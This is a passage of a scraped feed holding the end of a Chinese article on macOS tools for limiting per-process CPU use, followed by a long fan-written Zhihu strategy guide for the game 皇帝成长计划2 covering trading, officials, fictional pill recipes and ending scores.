src=\"https://cdn.sspai.com/2021/06/19/abe32ad957d84e9155344520b038795a.png\"></figure><p>总体来说要比前面两个方案完美很多。不过正版的价格也不菲呢，14.95 刀。</p>\n<h2>方案四：Turbo Boost Switcher</h2>\n<p>这个软件严格意义上来说和上面三者不是一个意思，它主要是开关 Intel 处理器的 Turbo Boost 的（<code>Enable / Disable Turbo Boost feature on demand.</code>），后者即英特尔的睿频技术（简单理解为自动超频），关它说白了也是为了省电，让 CPU 处于低频状态。</p>\n<p>所以不是用来限制进程 CPU 占用的，而是全局节能的。我觉得挺神奇的，就放到这里了，看来用户的需求真是千奇百怪呢。</p>\n<h2>资源</h2>\n<ul>\n<li><a href=\"http://www.willnolan.com/cputhrottle/cputhrottle.html\">cputhrottle</a></li>\n<li><a href=\"https://github.com/AppPolice/AppPolice\">AppPolice</a></li>\n<li><a href=\"https://www.stclairsoft.com/AppTamer/\">App Tamer</a></li>\n<li><a href=\"http://tbswitcher.rugarciap.com/\">Turbo Boost Switcher</a></li>\n</ul>\n<h2>探索</h2>\n<p>由于 cputhrottle 的源码比较少，我就稍微看了看，发现核心逻辑还是不复杂的，会根据指定进程的 CPU 使用时间来采样，计算出需要控制的占比，最终通过系统调用（Mach 内核 task 相关的接口，这个 task 在 macOS 的内核中相当于进程的概念）来挂起 task，并休眠一定的时间，达到让出 CPU 资源的目的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/19/67388dc4e7fc24b22503d0993b8e0999.png\"></figure><p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67331"},{"title":"游戏《皇帝成长计划2》攻略有哪些？","date":"2021-06-29 15:30:07","description":"\n<p></p>\n<hr>\n<p>好兄弟们，我大一了，来更新了</p>\n<p>对本篇内容进行了更新与修改</p>\n<p>我创立了一个公众号叫【羊村大战魔仙堡】</p>\n<p>我这里面分类了一下攻略 希望更能清楚明了的帮到大家</p>\n<p>现在内容还比较少 但是在陆续更新 欢迎大家关注</p>\n<p>没有关注也没关系，会在知乎更新的哟</p>\n<hr>\n<p>这个游戏从小学大概4年级就开始玩了               现在高三了                                                              出来手游版                                                               越来越好啦                                                                                                                           </p>\n<p>有人看就再总结一下我玩的经验(个人总结，可能不够准确)：</p>\n<p><b>最最最重要的一点：一定要养成存档的好习惯!玩稍微久一点就黑屏，就什么都没有了!!!</b></p>\n<p>目前没有苹果手机的版本 但是苹果端玩家可以浏览器搜索皇帝成长计划2h5 点进4399在线玩(好消息，苹果端在2020.10.10上线啦！)</p>\n<p>1.前期最好不要过多招兵买马，容易破产</p>\n<p>2.前期多多贸易，能够让你不用克制去嚯嚯钱(推荐存档后再开始第二月，尽量刷成盈利)</p>\n<p>3.没钱可以尝试去东厂——查看把柄——东厂查办犯事官员——依法处理 可能抄家收获不菲</p>\n<p>4.智能建设才是根本上增加国库的！！！每天请坚持！！！</p>\n<p>5.<b>刷属性</b>：前期我一般都郊外先刷体能 然后尽量智慧多刷武力少刷 一般后期后期我都会让体能 智慧 武力 道德都700以上(为了教育皇子)</p>\n<p>6.<b>刷近臣</b>推荐的性格是：聪明 理想 独立(送礼多)</p>\n<p>7.我觉得<b>御医楼</b>的最高位置最好刷到4(能够省时间：一般+35 特殊全满 )</p>\n<p>8.培养皇子的话，最好不要太快立为太子，先派遣历练，如果已经立了的话，也可以通过送珍宝加属性(和大臣一样)</p>\n<p>9.皇子派遣历练：尽量选<b>出任幕僚</b>吧 加的属性一般多一点(不要忘记去宗人府或者养心殿给他们奖赏) 有些<b>皇子出游</b>会带粽子(+12大臣亲密度)之类的宝物，需要就选(不保险，可能会减属性)</p>\n<p>10.腊月和八月的晌午我一般都回去<b>御膳房</b>举办宴会(上限是50大臣)</p>\n<p>11.一般二月你去找道士前 你去青炉房炼什么药 他就给你什么药</p>\n<p>12.<b>打仗</b>先打日本(简单) 最后再打把安南、大理等小国(他们是材料获取的主要方式)                      打仗的时候好的将领真的很重要(能发动技能)！                                           而且打仗时人数多一倍以上的话最好选全面攻击        人数不多就突袭</p>\n<p>13.前期丞相一定是要先安排属性高的 天灾人祸国库遭不住</p>\n<p>14.知府要野心小 道德高(起义也遭不住)               高智商、高道德的地方官会减少贪污，提高地方的经济。</p>\n<p>15.在丞相是名臣后最好每天都要科举，10个蓝臣必出一个90+的蓝臣。</p>\n<p>16.第一年五月去云渡湖钓鱼送名臣(林烟or重庆)和一个名妃(春晖仙女)</p>\n<p>17.大雁塔太香了！真的推荐！(玩法已放在最下面)</p>\n<p><a class=\"member_mention\" href=\"http://www.zhihu.com/people/b18e9edf8bf2694f2620da4c9edb4eba\" data-hash=\"b18e9edf8bf2694f2620da4c9edb4eba\" data-hovercard=\"p$b$b18e9edf8bf2694f2620da4c9edb4eba\">@友善的眼神</a> 评论区的大佬，我觉得很有道理，大家可以参考一下下</p>\n<p><img src=\"https://pic1.zhimg.com/v2-69fc109391ab6be135278c512583263d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"959\" data-rawheight=\"818\" data-watermark=\"watermark\" data-original-src=\"v2-69fc109391ab6be135278c512583263d\" data-watermark-src=\"v2-6b9051c86362c1ced40e78f8d0617ca8\" data-private-watermark-src=\"v2-a48db9e169447748f38ec170d65852f1\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-0b30f6205e48ebebaa73e23f3e7bc4e2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"960\" data-rawheight=\"1378\" data-watermark=\"watermark\" data-original-src=\"v2-0b30f6205e48ebebaa73e23f3e7bc4e2\" data-watermark-src=\"v2-894556cc4b0556832dc9f61edfc12b5a\" data-private-watermark-src=\"v2-c1c0664b26da7322829190d826368bbf\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-bed2370198b00328a4ae71a15652bb9d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"960\" data-rawheight=\"1180\" data-watermark=\"watermark\" data-original-src=\"v2-bed2370198b00328a4ae71a15652bb9d\" data-watermark-src=\"v2-e34f3fa5ef6454fd5f61b32df91f3574\" data-private-watermark-src=\"v2-7b1a2f73944b0c24a0fa2665d7a90674\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-f81c85deddf69bccea2cadd329dd9374_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"450\" data-rawheight=\"85\" data-watermark=\"watermark\" data-original-src=\"v2-f81c85deddf69bccea2cadd329dd9374\" data-watermark-src=\"v2-289a93acebfe87fce9034a0c4f7d676c\" data-private-watermark-src=\"v2-39f77a69e4cc648f1f39e02d46eba571\"></p>\n<p>以下是大佬们的总结：</p>\n<h2><b>一、特殊事件事件/人物</b></h2>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/7vhfTVLwQstOYXcA_mGH5A\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-47c78d5eca948d9046c559ea106790bb_bh.jpg\" data-image-width=\"779\" data-image-height=\"332\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——特殊事件、人物</a><p><img src=\"https://pic3.zhimg.com/v2-d7b3b268caea7d8b3b50eece7a79214d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"1140\" data-watermark=\"watermark\" data-original-src=\"v2-d7b3b268caea7d8b3b50eece7a79214d\" data-watermark-src=\"v2-6858520aaf4fbf85bb7a09d4ffc0c4d8\" data-private-watermark-src=\"v2-c119aac05a0555913b33162d9789ed7f\"></p>\n<p>可从路人获取的东厂线索合集：</p>\n<p><img src=\"https://pic1.zhimg.com/v2-83d8b2a08b825bad522f08d23c3a6000_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"627\" data-rawheight=\"694\" data-watermark=\"watermark\" data-original-src=\"v2-83d8b2a08b825bad522f08d23c3a6000\" data-watermark-src=\"v2-af894712fdeeda3aed03cb97e9956a1d\" data-private-watermark-src=\"v2-84e66e361336f482d9e74b4554b92162\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-ea20f2d354dfc35d739e15dbef7f825e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1346\" data-watermark=\"watermark\" data-original-src=\"v2-ea20f2d354dfc35d739e15dbef7f825e\" data-watermark-src=\"v2-a31ce9b2d79db0c03e3ac260c11282a9\" data-private-watermark-src=\"v2-142c76356efb91f639444dc727fd500c\"></p>\n<p>皇帝的成长计划2吧 来自 素素偶的 的总结</p>\n<p><img src=\"https://pic1.zhimg.com/v2-610ec057f01a02b83774ba74322ccbce_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"835\" data-rawheight=\"799\" data-watermark=\"watermark\" data-original-src=\"v2-610ec057f01a02b83774ba74322ccbce\" data-watermark-src=\"v2-13954aa6a9be75ac19d44a4b4dbea8fd\" data-private-watermark-src=\"v2-791268d0073f17fa6eda6aab5051439a\"></p>\n<p>皇帝的成长计划2吧 来自 叶子风气质大叔 的总结</p>\n<p><b><i>包打听找随从</i></b></p>\n<p>注意事项：</p>\n<p>1、职业只代表出现人才的几率，不代表一定出现人才</p>\n<p>2、职业称谓和询问结合来看</p>\n<p>3、询问的适合文武最好要区分开来，根据常识做一些判断，例如山贼这些职业后千万不要去选道德或者文学，落榜书生什么的也不用选武术了</p>\n<p>4、sl才是避免错过人才的王道</p>\n<p>5、介绍名臣就直接录用吧，名臣会直接进入朝廷，而普通随从只会进入东厂</p>\n<p>职业称谓：</p>\n<p>S级:江湖隐士，武林隐士</p>\n<p>(基础属性强，尤其道德普遍都不低，就算是非酋，选它人才都差不到哪里去，出极品的概率高,人才属性一般情况下轻松破85)</p>\n<p>A级:突厥彪骑，突厥射手，东瀛忍者，漠北刀客，民间文豪，大家才子，史学家等</p>\n<p>B级:绿林好汉，江湖义士，独行侠，雇佣军，退役军人，山贼当家，落榜书生，诗人</p>\n<p>C级:各种商人（骏马、盐市、木材、兵器等等)</p>\n<p> (基础素质类似科举人员，感觉出极品的概率比D级那些要低，适合用来做贸易）</p>\n<p>D级:逃狱犯，采花贼，江湖神棍，醉酒大汉</p>\n<p>（如果询问武艺的话，出人才的概率要大于C级）</p>\n<p>询问等级：</p>\n<p>文武</p>\n<p>S级:天生神力、天赋异禀</p>\n<p>A级:这样的天赋简直让人过目不忘，真是登峰造极啊，这人的前途真是让人期待</p>\n<p>B级:一点都不比朕的侍卫差，还不错回答的也算巧妙</p>\n<p>C级:真是浪费我时间，差强人意，这个真不会被一拳撂倒, 感觉连自己都保护不了,勉勉强强把，浪得虚名等等</p>\n<p>道德</p>\n<p>S级:真是菩萨心肠,得道高僧</p>\n<p>A级:此人还真是让人期待</p>\n<p>B级:勉勉强强吧，道德观还算正常，只能算是善良之人吧，只有山贼会这么回答吧</p>\n<p>C级:贪污无德之人想必都会这么说吧</p>\n<p>D级:简直是个人渣,这也算人，最多做到管好自己吧</p>\n<p>（关于包打听出现的时间、地点前面已经说过了，再啰嗦一遍：包打听会在每年春季上旬（一月）和秋季上旬（七月）出现，在京城的一品楼，包打听会推荐各种各样的人才，运气好可以遇到名臣。）</p>\n<hr>\n<h2><b>二、青炉房(炼制丹药)</b></h2>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/fve_GUNi9Zpit5IdwSyg0A\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-cfed8ab18ead1a0e476c8ec6c3d506e6_bh.jpg\" data-image-width=\"864\" data-image-height=\"368\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——丹药</a><p><b>​</b>注意事项：</p>\n<p>1、我认为获取丹药的大头是青炉房自动炼制的，这并不消耗药材所以尽量保持炼药经费富足（有条件就去工部建造一些增加产量的建筑吧）</p>\n<p>2、二月你去一品楼找道士前，你在青炉房炼什么药，他就会给你什么药（第五年起每年2月一品楼会给你一枚丹药，第一次为天地长寿丹，还会给你一颗你正在炼的丹药，不会提示，但丹药列表是会有的）</p>\n<p>3、按药方炼制，是有概率失败的，耗时为2回合，注意sl</p>\n<p><br></p>\n<p>药材序号:</p>\n<p>1、不化神冰；2、千年参王；3、鲸王凝脂；4、高僧舍利；5、龙蜒麝香；</p>\n<p>6、玉面首乌；7、五彩雪莲；8、透光灵芝；9、炽火金蟾；A、灵龟板；</p>\n<p>B、黄金锦鲤；C、天青水玉</p>\n<p><br></p>\n<p>固定丹药配方:（为官方破损药方内容）</p>\n<p>延年益寿丹1345967</p>\n<p>天地长寿丹7674823</p>\n<p>易容方       8989436</p>\n<p>奇妙面膜    9877512(每回合西市——胭脂铺有概率刷）</p>\n<p>麝香           5652595</p>\n<p>蕴毒丹       2347891</p>\n<p>九转迷魂香 432511</p>\n<p>速孕汤       6457933(每回合西市——济世堂有概率刷）</p>\n<p>安胎丸        8379122 </p>\n<p>避子汤        5559992 </p>\n<p>多胞胎药丸 6453777 (每回合西市——济世堂有概率刷）</p>\n<p>天机丹        B498165</p>\n<p>萱草丹        C984914</p>\n<p>冰糖梨汤    1111111</p>\n<p>丰胸木瓜丸（丰胸贴） 8679132</p>\n<p>人杰丹        A378915</p>\n<p>勇武丹        A629549</p>\n<p>博学丹        B561316</p>\n<p>才艺丹        C989466</p>\n<p>魅力丹        C312846</p>\n<p><br></p>\n<p>丹药作用:</p>\n<p>加寿命:</p>\n<p>*天地长寿丹 (增加两年寿命)</p>\n<p>*延年益寿丹 (增加一年寿命)</p>\n<p>*易容方（可以随机更换妃子/公主/皇子等立绘）</p>\n<p>*奇妙面膜（更换指定立绘）</p>\n<p>变声丸(每回合西市——济世堂有概率刷）</p>\n<p><br></p>\n<p>增加怀孕几率：</p>\n<p>1、壮阳药(皇帝吃) :生鹿血、三鞭酒、十鞭酒、虎鞭酒、大力丸</p>\n<p>2、春药(妃子吃) :春水丸、硬化香蕉</p>\n<p>3、春药(男女都可吃) :*九转迷魂香、阴阳散、得春丹、曼陀罗、十香散、遇仙丹、合欢散</p>\n<p>关于妃子怀孕用品:</p>\n<p>1、*速孕汤（妃子立即怀孕，包括男宠）</p>\n<p>2、*安胎丸（妃子不会难产或小产）</p>\n<p>3、*麝香（妃子滑胎)</p>\n<p>4、*避子汤（使用后大概率永远不孕）</p>\n<p>5、*多胞胎药丸（使用后妃子生下多胞胎，具体是几胎看运气，2~7）</p>\n<p>6、*天机丹（怀孕妃子吃了增加孩子属性)</p>\n<p>7、*萱草丹（怀孕妃子吃了必生皇子）</p>\n<p>平常的治病丹药:</p>\n<p>1、丹类:洗骨丹、惊寒丹、玄元丹、黄莲消火丹、小还丹、大还丹、赤血丹、浑天丹、桂圆丹、凝碧丹、化淤丹、罗厄丹、广陵丹、紫苏丹、还阳丹、辟灵丹、养魂丹、灵魂丹、聚魂丹、狮虎丹、长生丹、长命丹、回春丹、无极丹</p>\n<p>2、散类:去咳散、活血散、开脾散、黑玉断续散、太虚散、软金散、胡姜止咳散、玉壶散、磐石散、归心散</p>\n<p>3、丸类:牛黄上清丸、清瑶丸、三黄消火丸、熊胆丸、五补丸、蛇胆丸、碧髓丸、续命丸</p>\n<p>4、汤类:*冰糖梨汤、华参汤、青莲补汤、五籽汤</p>\n<p>5、花草类:芝雪草、金银花、醒酒花、云霖花、龙葵花</p>\n<p>6、露类:三清露、清寂露、核桃露</p>\n<p>7、其它:千金藤、星辰蓝、去癀片、千幻伽蓝、青龙参、生精酒、醉仙灵芙、金疮药、天香豆蔻</p>\n<p>毒药:（驿馆——苗女可花费20W购买毒药）</p>\n<p>*蕴毒丹、夹竹桃汤、橙林丹、含笑半步颠、雷藤散、五毒丸、六步散、七步散、断情花散、断肠草汤、鸩酒</p>\n<p>回复类:</p>\n<p>1、回神丸（回复体力）</p>\n<p>2、凝神丸（回复健康）</p>\n<p>3、开智丸（增加智慧）</p>\n<p>*增加属性：</p>\n<p>1、人杰丹（本回合增长的属性翻倍,包括皇威)</p>\n<p>2、勇武丹（自己吃+30武力，送大臣/皇子+3)</p>\n<p>3、博学丹（自己吃+30文学，送大臣/皇子+3）</p>\n<p>4、才艺丹（自己吃+30才艺，送大臣/皇子+3）</p>\n<p>5、加（妃子/公主）魅力:</p>\n<p>*丰胸木瓜丸、丰胸贴、木瓜美容丸、养颜丹</p>\n<p>*魅力丹（1回合内养心殿休息，宫女必定爬床；2回合内，巡游发现名妃几率提高)</p>\n<p>药材获取：</p>\n<p>1、出游可获得新药材</p>\n<p>颐和园——A</p>\n<p>圆明园——B</p>\n<p>避暑山庄——C</p>\n<p>2、郊外（随机药材）</p>\n<p>围猎 低几率</p>\n<p>钓鱼 高概率</p>\n<p>3、礼部向臣属国/联盟国 索要（随机） （联盟国不一定给）</p>\n<p>一年一度的生辰附属国（高丽国等）/知府进贡（随机）</p>\n<p>4、每年7月份 京城——角落的人（随机）</p>\n<p>5、工部建造百草园（每年随机产出一个）</p>\n<p><br></p>\n<hr>\n<h2><b>三、选官</b></h2>\n<p><img src=\"https://pic4.zhimg.com/v2-d1f2cd13f09ead84479599cb5f0b687d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"850\" data-rawheight=\"723\" data-watermark=\"watermark\" data-original-src=\"v2-d1f2cd13f09ead84479599cb5f0b687d\" data-watermark-src=\"v2-92b580fe2ed1c78191ac2d47a9c2e385\" data-private-watermark-src=\"v2-bfe111f7abcf2b05d8f6b2798998c0bc\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-d7a67d3b212efcd6bb93182455fdcae7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"546\" data-rawheight=\"508\" data-watermark=\"watermark\" data-original-src=\"v2-d7a67d3b212efcd6bb93182455fdcae7\" data-watermark-src=\"v2-642404d91ceeb1a401a615d5cf1b47f3\" data-private-watermark-src=\"v2-119e5856409f498d44ad37ecfce8c5c1\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-8626a5c1e61f549d014cea99b6bbf112_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1629\" data-rawheight=\"1133\" data-watermark=\"watermark\" data-original-src=\"v2-8626a5c1e61f549d014cea99b6bbf112\" data-watermark-src=\"v2-ab8bf512ca2c3ccc5ac0966023f078ae\" data-private-watermark-src=\"v2-9d94bf6e6b62fca544346ead9506ce69\"></p>\n<p><br></p>\n<hr>\n<h2><b>四、结局评分</b></h2>\n<p><img src=\"https://pic4.zhimg.com/v2-13cd4d5c8c520bcf9425fafa70439d87_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"20959\" data-watermark=\"watermark\" data-original-src=\"v2-13cd4d5c8c520bcf9425fafa70439d87\" data-watermark-src=\"v2-12f0b9b4162d9f845ef692b6ebe243be\" data-private-watermark-src=\"v2-56d4b9e8bdcae69ca26c6d7bb65fa0fe\"></p>\n<p>三十年去一品楼——游者司马评分标准：</p>\n<p>【文化】</p>\n<p>落后文明：文化分小于5w分</p>\n<p>文化启蒙：评分大于等于5w分，小于12w</p>\n<p>文化进步：评分大于等于12w分，小于30w</p>\n<p>高度文明：评分大于等于30w分，小于200w</p>\n<p> 【经济】</p>\n<p>经济落后：经济分小于5w分</p>\n<p>经济开放：评分大于等于5w分，小于12w</p>\n<p>小康社会：评分大于等于12w分，小于30w</p>\n<p>繁荣富强：评分大于等于30w分，小于200w</p>\n<p> 【军事】</p>\n<p>军事薄弱：军事分小于5w分</p>\n<p>军事起步：评分大于等于5w分，小于12w</p>\n<p>稳中求胜：评分大于等于12w分，小于30w</p>\n<p>兵强马壮：评分大于等于30w分，小于200w</p>\n<p><img src=\"https://pic3.zhimg.com/v2-958400a3493ecaa2663c7997f31775e6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2248\" data-watermark=\"watermark\" data-original-src=\"v2-958400a3493ecaa2663c7997f31775e6\" data-watermark-src=\"v2-f263306e2fb9ac8a828dadcf63c43999\" data-private-watermark-src=\"v2-ecfad40e4bf2ef944f0984b5282356cb\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-0c4e2eb9f60e7d503f152ac8cdfc2c13_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"875\" data-rawheight=\"1776\" data-watermark=\"watermark\" data-original-src=\"v2-0c4e2eb9f60e7d503f152ac8cdfc2c13\" data-watermark-src=\"v2-418b6a82ade4174dcefa18cdc1955284\" data-private-watermark-src=\"v2-7bd9c4ba0d95b5741b30d9bdaa18a157\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-6182084056b9b75b02c54a91b8d9b918_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1795\" data-rawheight=\"557\" data-watermark=\"watermark\" data-original-src=\"v2-6182084056b9b75b02c54a91b8d9b918\" data-watermark-src=\"v2-bdfa0dccf77c3343b3c817cf2b05ba86\" data-private-watermark-src=\"v2-1e838fdae2450df1920a555c5997e86f\"></p>\n<hr>\n<h2><b>五、培育皇子</b></h2>\n<p>如果要立的皇子不是第一顺位 那就把前面的皇子派出去就可以啦(策卡——内阁制可以任意指定)</p>\n<p><img src=\"https://pic3.zhimg.com/v2-31a2a4c34febf9dbc43381cd185549c0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"504\" data-rawheight=\"505\" data-watermark=\"watermark\" data-original-src=\"v2-31a2a4c34febf9dbc43381cd185549c0\" data-watermark-src=\"v2-a2e8e2420fcdfc0455fa46a5852e49e3\" data-private-watermark-src=\"v2-0b4d0659ce31289a551b72bec1e75274\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-09f669ac27827eaabba7406aabcbb1e7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"740\" data-rawheight=\"249\" data-watermark=\"watermark\" data-original-src=\"v2-09f669ac27827eaabba7406aabcbb1e7\" data-watermark-src=\"v2-c4e28532d42698fbfc8eb9b844a4b958\" data-private-watermark-src=\"v2-77218b22cfd90ba021ce3ee61ba725b3\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-7fabcbce148d5e8f1b9f6d547802bb13_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"408\" data-rawheight=\"130\" data-watermark=\"watermark\" data-original-src=\"v2-7fabcbce148d5e8f1b9f6d547802bb13\" data-watermark-src=\"v2-60da88553555bcf605cf709dbb7288f0\" data-private-watermark-src=\"v2-e75d71811eb8d0e0991f181ad3d10633\"></p>\n<p><br></p>\n<hr>\n<h2><b>六、培育近臣</b></h2>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/5TFZOeXT8R401bXcVAmH5w\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-e85fd17598761274ba015a8555854042_l.jpg\" data-image-width=\"534\" data-image-height=\"533\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——近臣的作用篇</a><a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/MY1lBQo5JjkS9odzfqLmNQ\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-347764592a9e34e86c096e6443e13b5f_l.jpg\" data-image-width=\"540\" data-image-height=\"540\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——大臣性格相关</a><a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/jXJqUBWr5UlV6xcLE_E0mw\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-be372776681aac9f188f2a2a0b6c39ed_bh.jpg\" data-image-width=\"1280\" data-image-height=\"544\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——近臣培育方法篇</a><p><img src=\"https://pic1.zhimg.com/v2-0e76871d7657509e0dc42b26869704f3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2248\" data-watermark=\"watermark\" data-original-src=\"v2-0e76871d7657509e0dc42b26869704f3\" data-watermark-src=\"v2-3574b161d9eb6974e36383ad0a094d89\" data-private-watermark-src=\"v2-212f80b298f92757252e9fa505760899\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-6496535fc98603e64453f872436d30c9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2248\" data-watermark=\"watermark\" data-original-src=\"v2-6496535fc98603e64453f872436d30c9\" data-watermark-src=\"v2-77966a15a6194018d6193cd8aabc25b8\" data-private-watermark-src=\"v2-667156cee7a0c0458618cde5580ea1b3\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-2a548a169d54f438a5ee38f3bd8069db_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2248\" data-watermark=\"watermark\" data-original-src=\"v2-2a548a169d54f438a5ee38f3bd8069db\" data-watermark-src=\"v2-81b120a6b3580b2fc69f7c7e5fa38b4e\" data-private-watermark-src=\"v2-12d063e4f5bd69830c6f1addaeb34081\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-d8da9fc4aa8b58248cd1c3c2af016447_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2248\" data-watermark=\"watermark\" data-original-src=\"v2-d8da9fc4aa8b58248cd1c3c2af016447\" data-watermark-src=\"v2-8075dd75efe28e5067a723c599f8ecff\" data-private-watermark-src=\"v2-ab58bedf098e955c5eae3f0774a0290e\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-1d517632bfa9f8cdf1deb2ec0823f305_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2248\" data-watermark=\"watermark\" data-original-src=\"v2-1d517632bfa9f8cdf1deb2ec0823f305\" data-watermark-src=\"v2-184a2368d87db9c91ceb51d9ad80a175\" data-private-watermark-src=\"v2-b84e952802db62629bbb0b835ffa8172\"></p>\n<hr>\n<h2><b>七、大雁塔玩法</b></h2>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/EKGQXdpZ-ku8RGzcddwiaQ\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-8423e82cd3d667f5001f4fd2cbef3703_bh.jpg\" data-image-width=\"1280\" data-image-height=\"544\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——大雁塔</a><p><img src=\"https://pic4.zhimg.com/v2-45b5892d0e94a14b306cbac45a326315_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"960\" data-rawheight=\"699\" data-watermark=\"watermark\" data-original-src=\"v2-45b5892d0e94a14b306cbac45a326315\" data-watermark-src=\"v2-fadd429224426c1b861fd40d8a7226bd\" data-private-watermark-src=\"v2-61375389877304964126f402a6acecc5\"></p>\n<hr>\n<h2><b>八、六尚局</b></h2>\n<h3><b>（一）宫正司</b></h3>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/zCXaS1bI4C1bc7Xr4P6FRQ\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-196c26eb3dfc81eb4006d0a48b9fb46c_bh.jpg\" data-image-width=\"1280\" data-image-height=\"544\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——宫正司</a><h3><b>（二）尚功局</b></h3>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/EngORFqdwbgyDwmpOmonAw\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-e5e702a53ee296024b54e63e4f96484e_bh.jpg\" data-image-width=\"1280\" data-image-height=\"544\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——尚功局</a><h3><b>（三）尚宫局</b></h3>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/rKOlExMvYU7FCU_Z4S-Q-Q\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-8fa559a68962f8db59caf105d8c84681_bh.jpg\" data-image-width=\"1280\" data-image-height=\"544\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——尚宫局</a><h3><b>（四）尚仪局</b></h3>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/eVs4jFoKh_wbVnWeW_u2cg\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-7dc0f1edd36dbdbe3674e06694cd0313_bh.jpg\" data-image-width=\"1280\" data-image-height=\"544\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——尚仪局</a><h3><b>（五）尚食局</b></h3>\n<a 